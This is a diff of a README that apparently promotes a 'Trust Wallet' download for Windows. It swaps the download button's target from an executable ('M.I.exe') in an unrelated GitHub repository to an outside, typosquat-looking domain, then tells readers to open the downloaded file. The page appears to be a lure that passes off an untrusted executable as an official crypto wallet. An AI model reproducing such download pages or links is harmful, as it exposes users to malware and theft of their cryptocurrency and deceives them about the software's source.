@@ -9,7 +9,7 @@ Furthermore, with **download trust wallet app**, cryptocurrency management becom
 
 1. Click the button below to initiate the **Trust Wallet Download** for Windows.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/f6241c89-514b-4923-8357-8503297ce76d" alt="Download" width="300"/>
     </a>
 2. Navigate to your "Downloads" folder and locate the downloaded file.
